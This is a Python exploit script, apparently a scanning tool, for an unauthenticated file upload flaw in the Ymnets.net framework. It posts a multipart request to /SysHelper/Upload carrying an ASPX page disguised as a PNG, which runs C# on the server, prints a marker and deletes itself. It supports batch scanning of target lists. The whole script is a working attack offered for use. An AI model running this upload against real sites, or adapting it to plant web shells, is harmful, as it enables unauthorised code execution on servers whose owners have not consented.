import requests
import argparse


# Function to check for vulnerabilities on a single URL
def check_vul(url):
    # Construct the target URL
    target_url = f'{url.strip()}/SysHelper/Upload'

    # Prepare the payload for the POST request
    payload = '''------WebKitFormBoundaryu178FOm4XGgDZqeX
Content-Disposition: form-data; name="Filedata"; filename="2.aspx"
Content-Type: image/png

<%@Page Language="C#"%>
<%
Response.Write(System.Text.Encoding.GetEncoding(65001).GetString(System.Convert.FromBase64String("bmpoYW8=")));
System.IO.File.Delete(Request.PhysicalPath);
%>
------WebKitFormBoundaryu178FOm4XGgDZqeX--'''

    # Set the request headers
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36',
        'Content-Type': 'multipart/form-data; boundary=----WebKitFormBoundaryu178FOm4XGgDZqeX'
    }

    try:
        # Send the POST request
        response = requests.post(target_url, data=payload, headers=headers, timeout=6)
        status_code = response.status_code

        # Attempt to parse JSON response
        try:
            json_response = response.json()
            file_path = json_response.get('FilePath')

            if status_code == 200 and file_path:
                print(f'[+]{url} 存在漏洞')
            else:
                print(f'{url} 不存在漏洞')
        except ValueError:
            print(f'{url} 的响应不是有效的JSON格式')

    except requests.RequestException as e:
        print(f'连接出现问题: {e}')


# Function to check vulnerabilities in a list of URLs from a file
def check_vuls(filename):
    with open(filename, 'r') as file:
        for line in file:
            check_vul(line.strip())


# Function to display banner information
def banner():
    info = '''

YYYYYYY       YYYYYYY                                                                    tttt                           
Y:::::Y       Y:::::Y                                                                 ttt:::t                           
Y:::::Y       Y:::::Y                                                                 t:::::t                           
Y::::::Y     Y::::::Y                                                                 t:::::t                           
YYY:::::Y   Y:::::YYYmmmmmmm    mmmmmmm   nnnn  nnnnnnnn        eeeeeeeeeeee    ttttttt:::::ttttttt        ssssssssss   
   Y:::::Y Y:::::Y mm:::::::m  m:::::::mm n:::nn::::::::nn    ee::::::::::::ee  t:::::::::::::::::t      ss::::::::::s  
    Y:::::Y:::::Y m::::::::::mm::::::::::mn::::::::::::::nn  e::::::eeeee:::::eet:::::::::::::::::t    ss:::::::::::::s 
     Y:::::::::Y  m::::::::::::::::::::::mnn:::::::::::::::ne::::::e     e:::::etttttt:::::::tttttt    s::::::ssss:::::s
      Y:::::::Y   m:::::mmm::::::mmm:::::m  n:::::nnnn:::::ne:::::::eeeee::::::e      t:::::t           s:::::s  ssssss 
       Y:::::Y    m::::m   m::::m   m::::m  n::::n    n::::ne:::::::::::::::::e       t:::::t             s::::::s      
       Y:::::Y    m::::m   m::::m   m::::m  n::::n    n::::ne::::::eeeeeeeeeee        t:::::t                s::::::s   
       Y:::::Y    m::::m   m::::m   m::::m  n::::n    n::::ne:::::::e                 t:::::t    ttttttssssss   s:::::s 
       Y:::::Y    m::::m   m::::m   m::::m  n::::n    n::::ne::::::::e                t::::::tttt:::::ts:::::ssss::::::s
    YYYY:::::YYYY m::::m   m::::m   m::::m  n::::n    n::::n e::::::::eeeeeeee        tt::::::::::::::ts::::::::::::::s 
    Y:::::::::::Y m::::m   m::::m   m::::m  n::::n    n::::n  ee:::::::::::::e          tt:::::::::::tt s:::::::::::ss  
    YYYYYYYYYYYYY mmmmmm   mmmmmm   mmmmmm  nnnnnn    nnnnnn    eeeeeeeeeeeeee            ttttttttttt    sssssssssss    

'''
    print(info)
    print('-u http://www.xxx.com 进行单个漏洞检测')
    print('-f targetUrl.txt 对选中文档中的网址进行批量检测')
    print('--help 查看更多详细帮助信息')
    print('3052187779@qq.com')


# Main program execution
def main():
    parser = argparse.ArgumentParser(description="Ymnets.net框架文件上传")
    parser.add_argument('-f', help='请输入网站文件')
    parser.add_argument('-u', help='请输入url')
    args = parser.parse_args()

    if not args.u and not args.f:
        banner()
    else:
        banner()
        try:
            if args.f:
                check_vuls(args.f)
            else:
                check_vul(args.u)
        except Exception as e:
            print(f'运行发生错误: {e}')


if __name__ == '__main__':
    main()
